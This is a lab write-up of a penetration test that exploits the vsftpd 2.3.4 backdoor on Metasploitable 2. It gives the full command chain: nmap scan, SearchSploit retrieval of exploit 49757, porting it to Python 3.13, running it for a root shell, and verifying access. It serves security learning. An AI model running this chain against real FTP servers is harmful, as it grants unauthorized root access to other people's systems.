# Lab Commands

This document contains the main commands used during the **vsftpd 2.3.4 penetration testing lab**.

The commands were executed in an authorized and isolated laboratory environment using Kali Linux against Metasploitable 2.

---

## 1. Check Python Version

Before running the exploit, I checked the Python version available on my Kali Linux system.

```bash
python3 --version
```

Result:

```text
Python 3.13.12
```

This became relevant because the original exploit used the `telnetlib` module, which was removed from Python 3.13.

---

## 2. Reconnaissance with Nmap

I scanned the target to identify exposed services and their versions.

```bash
nmap -sV <METASPLOITABLE-IP>
```

The scan identified:

```text
21/tcp open ftp vsftpd 2.3.4
```

### Purpose

This allowed me to identify the FTP service and determine the exact version of vsftpd running on the target.

---

## 3. Test the FTP Service

I initially connected to the FTP service to confirm that it was reachable.

```bash
ftp msfadmin@<METASPLOITABLE-IP>
```

The connection was successful.

### Purpose

This confirmed that the FTP service was accessible before attempting to exploit the vulnerability.

---

## 4. Search for Known Exploits

I used SearchSploit to search the local Exploit-DB database for exploits related to vsftpd 2.3.4.

```bash
searchsploit vsftpd 2.3.4
```

The search returned exploits including:

```text
vsftpd 2.3.4 - Backdoor Command Execution
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)
```

### Purpose

This helped identify publicly documented exploitation methods for the vulnerable software version.

---

## 5. Examine the Exploit

I reviewed the available Python exploit before using it.

```bash
searchsploit -x 49757
```

### Purpose

Reviewing the exploit helped me understand how it interacted with the vulnerable FTP service.

---

## 6. Copy the Exploit

I copied the exploit into my working directory:

```bash
searchsploit -m 49757
```

I then renamed the copied file:

```bash
cp 49757.py vsftpd_exploit.py
```

### Purpose

This allowed me to work with my own local copy of the exploit rather than modifying the original Exploit-DB copy.

---

## 7. Adapt the Exploit for Python 3.13

The original exploit relied on Python's `telnetlib` module.

Because my system was running Python 3.13, I adapted the script to use Python's `socket` functionality instead.

The resulting script was saved as:

```text
vsftpd_exploit.py
```

---

## 8. Check the Modified Script

Before testing the modified exploit against the target, I checked the script for Python syntax errors.

```bash
python3 -m py_compile vsftpd_exploit.py
```

The command completed without producing an error.

### Purpose

This confirmed that the modified Python script was syntactically valid before attempting the lab exploitation.

---

## 9. View Exploit Help

I checked that the modified script accepted the expected target argument.

```bash
python3 vsftpd_exploit.py --help
```

The script displayed its usage information and required a target host/IP address.

---

## 10. Execute the Exploit

I ran the modified exploit against the Metasploitable 2 machine:

```bash
python3 vsftpd_exploit.py <METASPLOITABLE-IP>
```

The exploit successfully triggered the vsftpd 2.3.4 backdoor and opened a shell.

---

## 11. Verify Access

After obtaining the shell, I verified the access level and target system.

```bash
whoami
hostname
id
```

The results confirmed that the shell had root-level privileges on the intentionally vulnerable Metasploitable 2 system.

### Purpose

These commands provided evidence that the exploitation was successful and allowed me to verify the level of access obtained.

---

## 12. Exit the Shell

After completing the verification, I exited the shell using:

```text
exit
```

---

## Summary

The overall command workflow was:

```text
Nmap
  ↓
Identify FTP / vsftpd 2.3.4
  ↓
Test FTP connectivity
  ↓
SearchSploit
  ↓
Review exploit
  ↓
Copy exploit
  ↓
Adapt for Python 3.13
  ↓
Syntax check
  ↓
Execute exploit
  ↓
Verify access with whoami / hostname / id
```

> **Disclaimer:** All commands documented here were performed against an intentionally vulnerable Metasploitable 2 machine in an authorized, isolated laboratory environment. Do not use these techniques against systems without explicit authorization.
